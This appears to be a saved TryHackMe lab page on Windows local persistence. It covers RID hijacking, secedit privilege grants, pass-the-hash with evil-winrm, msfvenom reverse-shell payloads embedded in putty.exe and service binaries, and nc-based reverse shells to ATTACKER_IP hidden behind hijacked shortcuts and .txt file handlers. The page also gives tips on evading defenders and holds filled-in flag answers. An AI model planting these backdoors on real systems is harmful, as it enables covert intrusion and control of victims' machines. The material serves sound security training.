<p>And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
             AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3</span></span></code>
        </pre>
    </div>
</div>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/2cbaa6465407d8b45e363f24a33efec6.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Using the Administrator console gained through the thmuser1, execute <code>C:\flags\flag1.exe</code> to retrieve your flag.</span>
        </div>
</div>
<p><span style="font-size:24px">Special Privileges and Security Descriptors</span></p>
<p>A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. <strong>Privileges</strong> are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be found <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">here</a> for reference.</p>
<p>In the case of the Backup Operators group, it has the following two privileges assigned by default:</p>
<ul>
<li><strong>SeBackupPrivilege:</strong><span> The user can read any file in the system, ignoring any <a class="4cRFJDW2 glossary-term" onclick="initPopOver(&#39;DACL&#39;, &#39;4cRFJDW2&#39;)">DACL</a> in place.</span></li>
<li><strong>SeRestorePrivilege:</strong><span> The user can write any file in the system, ignoring any <a class="GtXwHRuV glossary-term" onclick="initPopOver(&#39;DACL&#39;, &#39;GtXwHRuV&#39;)">DACL</a> in place.</span></li>
</ul>
<p>We can assign such privileges to any user, independent of their group memberships. To do so, we can use the <code>secedit</code> command. First, we will export the current configuration to a temporary file:</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell">secedit <span class="token operator">/</span>export <span class="token operator">/</span>cfg config<span class="token punctuation">.</span>inf</code></pre>
<p>We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:</p>
<p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Windows Local Persistence_files/765671a0355e2260c44e5a12a10f090e.png" alt="config.inf contents"><br></p>
<p>We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell">secedit <span class="token operator">/</span>import <span class="token operator">/</span>cfg config<span class="token punctuation">.</span>inf <span class="token operator">/</span>db config<span class="token punctuation">.</span>sdb

secedit <span class="token operator">/</span>configure <span class="token operator">/</span>db config<span class="token punctuation">.</span>sdb <span class="token operator">/</span>cfg config<span class="token punctuation">.</span>inf</code></pre>
<p>You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a <strong>security descriptor</strong><span> as an <a class="8cQi4UW6 glossary-term" onclick="initPopOver(&#39;ACL&#39;, &#39;8cQi4UW6&#39;)">ACL</a> but applied to other system facilities.</span></p>
<p>To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this):</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">Set-PSSessionConfiguration</span> <span class="token operator">-</span>Name Microsoft<span class="token punctuation">.</span><span><a class="RAVH2Tj9 glossary-term" onclick="initPopOver(&#39;PowerShell&#39;, &#39;RAVH2Tj9&#39;)">PowerShell</a> </span><span class="token operator">-</span>showSecurityDescriptorUI</code></pre>
<p>This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:</p>
<p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Windows Local Persistence_files/380c80b98c4d1f8c2149ef72427cfeb0.png" alt="WinRM security descriptor"><br></p>
<p>Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.</p>
<p>Notice that for this user to work with the given privileges fully, you'd have to change the <strong>LocalAccountTokenFilterPolicy</strong> registry key, but we've done this already to get the previous flag.</p>
<p>If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None
</span></code>
        </pre>
    </div>
</div>

<p>Once again, we'll assume we have already dumped the credentials on the server and have thmuser2's password. Let's connect with its credentials using WinRM:</p>

<div style="display:flex;justify-content:center">
	<div style="width:450px;display:flex;align-items:center;background-color:#e6e6e6;border-radius:8px;box-shadow:5px 5px 5px;padding:20px;margin-bottom:15px">
		<img src="./TryHackMe _ Windows Local Persistence_files/94fe3c0f556877a2721ca9e0744ad026.png" alt="THM key" style="max-height:120px">
		<span style="text-align:left;padding-left:20px;font-size:20px;width:100%">
		<table style="width:100%;border-spacing:4px;border-collapse:separate">
			<tbody><tr><td style="width:110px"><b>Username </b></td><td style="background-color:white;border-radius:5px;padding:4px">thmuser2</td></tr>
			<tr><td><b>Password </b></td><td style="background-color:white;border-radius:5px;padding:4px">Password321</td></tr>
		</tbody></table>
		</span>
	</div>
</div>

<p>We can log in with those credentials to obtain the flag.</p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/2cbaa6465407d8b45e363f24a33efec6.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Log in to the machine via WinRM using thmuser2 and execute <code>C:\flags\flag2.exe</code> to retrieve your flag.</span>
        </div>
</div>
<p><span style="font-size:24px">RID Hijacking</span></p>
<p>Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.</p>
<p>When a user is created, an identifier called <strong>Relative ID (RID) </strong>is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.</p>
<p>In any Windows system, the default Administrator account is assigned the <strong>RID = 500</strong>, and regular users usually have <strong>RID &gt;= 1000</strong>.</p>
<p>To find the assigned RIDs for any user, you can use the following command:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010</span></code>
        </pre>
    </div>
</div>
<p>The RID is the last bit of the SID (1010 for thmuser3 and 500 for Administrator). The SID is an identifier that allows the operating system to identify a user across a domain, but we won't mind too much about the rest of it for this task.</p>
<p>Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in <code>C:\tools\pstools</code> in your machine:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\tools\pstools&gt; PsExec64.exe -i -s regedit</span></code>
        </pre>
    </div>
</div>
<p>From Regedit, we will go to <code>HKLM\SAM\SAM\Domains\Account\Users\</code> where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called <strong>F</strong>, which holds the user's effective RID at position 0x30:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/d630140974989748ebcf150ba0696d14.png" alt="RID hijacking 1"><br></p>
<p>Notice the RID is stored using little-endian notation,&nbsp;so its bytes appear reversed.</p>
<p>We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):</p>
<p style="text-align:center"><img style="border:1px solid" src="./TryHackMe _ Windows Local Persistence_files/8f2072b6d13b7343cf7b890586703ddf.png" alt="RID hijacking 2"><br></p>
<p>The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.</p>
<p><span>For this task, we assume you have already compromised the system and obtained the password for thmuser3. For your convenience, the user can connect via <a class="192GjqVo glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;192GjqVo&#39;)">RDP</a> with the following credentials:</span></p>

<div style="display:flex;justify-content:center">
	<div style="width:450px;display:flex;align-items:center;background-color:#e6e6e6;border-radius:8px;box-shadow:5px 5px 5px;padding:20px;margin-bottom:15px">
		<img src="./TryHackMe _ Windows Local Persistence_files/94fe3c0f556877a2721ca9e0744ad026.png" alt="THM key" style="max-height:120px">
		<span style="text-align:left;padding-left:20px;font-size:20px;width:100%">
		<table style="width:100%;border-spacing:4px;border-collapse:separate">
			<tbody><tr><td style="width:110px"><b>Username </b></td><td style="background-color:white;border-radius:5px;padding:4px">thmuser3</td></tr>
			<tr><td><b>Password </b></td><td style="background-color:white;border-radius:5px;padding:4px">Password321</td></tr>
		</tbody></table>
		</span>
	</div>
</div>

<p>If you did everything correctly, you should be logged in to the Administrator's desktop.&nbsp;</p><p><br><span style="font-size:1rem;font-weight:bolder">Note:</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem"><span>When you log in via <a class="z6cIF3dk glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;z6cIF3dk&#39;)">RDP</a>, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing</span></span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem;font-weight:bolder">Reconnect</span><span style="font-size:1rem">.</span></p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/2cbaa6465407d8b45e363f24a33efec6.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px"><span>Log in to the machine via <a class="C6qpQBRI glossary-term" onclick="initPopOver(&#39;RDP&#39;, &#39;C6qpQBRI&#39;)">RDP</a> using thmuser3 and execute </span><code>C:\flags\flag3.exe</code> to retrieve your flag.</span>
        </div>
</div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Insert flag1 here
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{***************}" value="THM{FLAG_BACKED_UP!}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Insert flag2 here</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*********************}" value="THM{IM_JUST_A_NORMAL_USER}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Insert flag3 here<br></p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{********************}" value="THM{TRUST_ME_IM_AN_ADMIN}" disabled="">
                            <input type="hidden" value="3">
                            <input type="hidden" value="2">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-3">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 3                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Backdooring Files
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse3" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Another method of establishing persistence consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.</p>
<p>While there are many opportunities to plant backdoors, we will check the most commonly used ones.</p>

<p><span style="font-size:24px">Executable Files</span></p>
<p>If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to <code>C:\Program Files\PuTTY\putty.exe</code>. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.</p>
<p>You can easily plant a payload of your preference in any .exe file with <code>msfvenom</code>. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:</p>
<pre class=" language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe</span></code></pre>
<p>The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. While this method is good enough to establish persistence, let's look at other sneakier techniques.</p>

<p><span style="font-size:24px">Shortcut Files</span></p>
<p>If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.</p>
<p>For this task, let's check the shortcut to <strong>calc</strong> on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/7a7349b9dcc5af3180044ee1d7605967.png" alt="calc properties"><br></p>
<p>Before hijacking the shortcut's target, let's create a simple Powershell script in <code>C:\Windows\System32</code> or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">Start-Process</span> <span class="token operator">-</span>NoNewWindow <span class="token string">"c:\tools\nc64.exe"</span> <span class="token string">"-e cmd.exe ATTACKER_IP 4445"</span>

C:\Windows\System32\calc<span class="token punctuation">.</span>exe
</code></pre>
<p>Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add the <code>-windowstyle hidden</code> option to Powershell. The final target of the shortcut would be:</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>WindowStyle hidden C:\Windows\System32\backdoor<span class="token punctuation">.</span>ps1</code></pre>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/fe703ddea6135e0c867afcc6f61a8cd2.png" alt="backdoored lnk file"><br></p>
<p>Let's start an nc listener to receive our reverse shell on our attacker's machine:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc</span> -lvp <span class="token number">4445</span></span></span></code>
        </pre>
    </div>
</div>
<p>If you double-click the shortcut, you should get a connection back to your attacker's machine. Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen. A regular user might not mind too much about that, hopefully.&nbsp;</p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/2cbaa6465407d8b45e363f24a33efec6.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Execute <code>C:\flags\flag5.exe</code> from your reverse shell to get your flag!</span>
        </div>
</div>

<p><span style="font-size:24px">Hijacking File Associations</span></p>
<p>In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.</p>
<p>The default operating system file associations are kept inside the registry, where a key is stored for every single file type under <code>HKLM\Software\Classes\</code>. Let's say we want to check which program is used to open .txt files; we can just go and check for the <code>.txt</code> subkey and find which <strong>Programmatic ID (ProgID)</strong>&nbsp;is associated with it. A ProgID is simply an identifier to a program installed on the system. For .txt files, we will have the following ProgID:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/3ae1b8356b38a349090e836026d6d480.png" alt="File extensions in registry"><br></p>
<p>We can then search for a subkey for the corresponding ProgID (also under <code>HKLM\Software\Classes\</code>), in this case,&nbsp;<code>txtfile</code>, where we will find a reference to the program in charge of handling .txt files. Most ProgID entries will have a subkey under <code>shell\open\command</code> where the default command to be run for files with that extension is specified:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/c3565cf93de4990f41f41b25aed80571.png" alt="ProgID in registry"><br></p>
<p>In this case, when you try to open a .txt file, the system will execute <code>%SystemRoot%\system32\NOTEPAD.EXE %1</code>, where <code>%1</code> represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to <code>C:\Windows\backdoor2.ps1</code>:</p>
<pre class=" language-powershell" tabindex="0"><code class=" language-powershell"><span class="token function">Start-Process</span> <span class="token operator">-</span>NoNewWindow <span class="token string">"c:\tools\nc64.exe"</span> <span class="token string">"-e cmd.exe ATTACKER_IP 4448"</span>
C:\Windows\system32\NOTEPAD<span class="token punctuation">.</span>EXE <span class="token variable">$args</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span></code></pre>
<p>Notice how in Powershell, we have to pass <code>$args[0]</code> to notepad, as it will contain the name of the file to be opened, as given through <code>%1</code>.</p>
<p>Now let's change the registry key to run our backdoor script in a hidden window:</p>
<p style="text-align:center"><img src="./TryHackMe _ Windows Local Persistence_files/f7ed25a701cf20ea85cf333b20708ffe.png" alt="backdoored ProgID"><br></p>
<p>Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.</p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/2cbaa6465407d8b45e363f24a33efec6.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Once you have backdoored the .txt file handler and spawned a reverse shell, run <code>C:\flags\flag6.exe</code> to get a flag!</span>
        </div>
</div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Insert flag5 here</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{********************}" value="THM{NO_SHORTCUTS_IN_LIFE}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Insert flag6 here</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{******************************}" value="THM{TXT_FILES_WOULD_NEVER_HURT_YOU}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="3">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-4">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse4">
                        <a class="card-link">
                            <span class="task-dropdown-title hacker-green">Task 4                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Abusing Services
                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
                            <span class="task-resources"></span>
                        </a>
                    </div>
                    <div id="collapse4" class="collapse " data-parent="#taskContent">
                        <div class="card-body task-complete">
                            <div class="room-task-desc">
            <div class="room-task-desc-data"> <p>Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.</p>
<p>A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.</p>
<p>There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.</p>

<p><span style="font-size:24px">Creating backdoor services</span></p>
<p>We can create and start a service named "THMservice" using the following commands:</p>
<pre class=" language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice</span></code></pre>
<p><strong>Note:</strong> There must be a space after each equal sign for the command to work.</p>
<p>The "net user" command will be executed when the service is started, resetting the Administrator's password to <code>Passwd123</code>. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.</p>
<p>Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the <code>exe-service</code> format in msfvenom:</p>
<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ATTACKER_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4448</span> -f exe-service -o rev-svc.exe</span></span></code>
        </pre>
    </div>
</div>
<p>You can then copy the executable to your target system, say in <code>C:\Windows</code> and point the service's binPath to it:</p>
<pre class=" language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2</span></code></pre>
<p>This should create a connection back to your attacker's machine.</p>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/2cbaa6465407d8b45e363f24a33efec6.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Use the reverse shell you just gained to execute <code>C:\flags\flag7.exe</code></span>
        </div>
</div>

<p><span style="font-size:24px">Modifying existing services</span></p>
<p>While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.</p>
<p>You can get a list of available services using the following command:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; sc.exe query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0</span></code>
        </pre>
    </div>
</div>
<p>You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service</span></code>
        </pre>
    </div>
</div>
<p>There are three things we care about when using a service for persistence:</p>
<ul>
<li>The executable (<strong>BINARY_PATH_NAME</strong>) should point to our payload.</li>
<li>The service <b>START_TYPE</b> should be automatic so that the payload runs without user interaction.</li>
<li>The <strong>SERVICE_START_NAME</strong>, which is the account under which the service will run, should preferably be set to <strong>LocalSystem</strong> to gain SYSTEM privileges.</li>
</ul>
<p>Let's start by creating a new reverse shell with msfvenom:</p>

<div class="terminal-container">
    <div class="terminal-content attacker">
        <div class="terminal-top">
            AttackBox
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token command"><span class="token info punctuation"><span class="token user">user@AttackBox</span></span><span class="token shell-symbol important">$</span> <span class="token bash language-bash">msfvenom -p windows/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>ATTACKER_IP <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">5558</span> -f exe-service -o rev-svc2.exe</span></span></code>
        </pre>
    </div>
</div>

<p>To reconfigure "THMservice3" parameters, we can use the following command:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"</span></code>
        </pre>
    </div>
</div>
<p>You can then query the service's configuration again to check if all went as expected:</p>
<div class="terminal-container">
    <div class="terminal-content">
        <div class="terminal-top">
            Command Prompt
        </div>
        <pre class="terminal-code language-shell-session" tabindex="0"><code class=" language-shell-session"><span class="token output">C:\&gt; sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem</span></code>
        </pre>
    </div>
</div>
<div style="display:flex;justify-content:center">
        <div style="width:75%;display:flex;align-items:center;background-color:#3e4a61;border:0px solid;color:white;border-radius:8px;padding:10px;margin-bottom:15px">
            <img src="./TryHackMe _ Windows Local Persistence_files/2cbaa6465407d8b45e363f24a33efec6.png" alt="THM flag" width="120px"><span style="text-align:left;padding-left:20px">Start a Metasploit listener on your attacker's machine and manually start the service to receive a reverse shell. From there, run <code>C:\flags\flag8.exe</code> to get a flag!</span>
        </div>
</div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green">
            <div>Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                Insert flag7 here
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{*******************}" value="THM{SUSPICIOUS_SERVICES}" disabled="">
                            <input type="hidden" value="1">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div><div class="room-task-questions">
                            <div class="room-task-question-no vertical-align-custom">
                                
                            </div>
                            <div class="room-task-question-details">
                                <p>Insert flag8 here</p>
                            </div>
                        </div>

                    <div class="room-task-input">
                        <div class="room-task-input-questions">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{**************}" value="THM{IN_PLAIN_SIGHT}" disabled="">
                            <input type="hidden" value="2">
                            <input type="hidden" value="4">
                        </div>
                        <div class="room-task-input-answer">
                            <button type="button" class="btn btn-success task-answer" disabled="">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
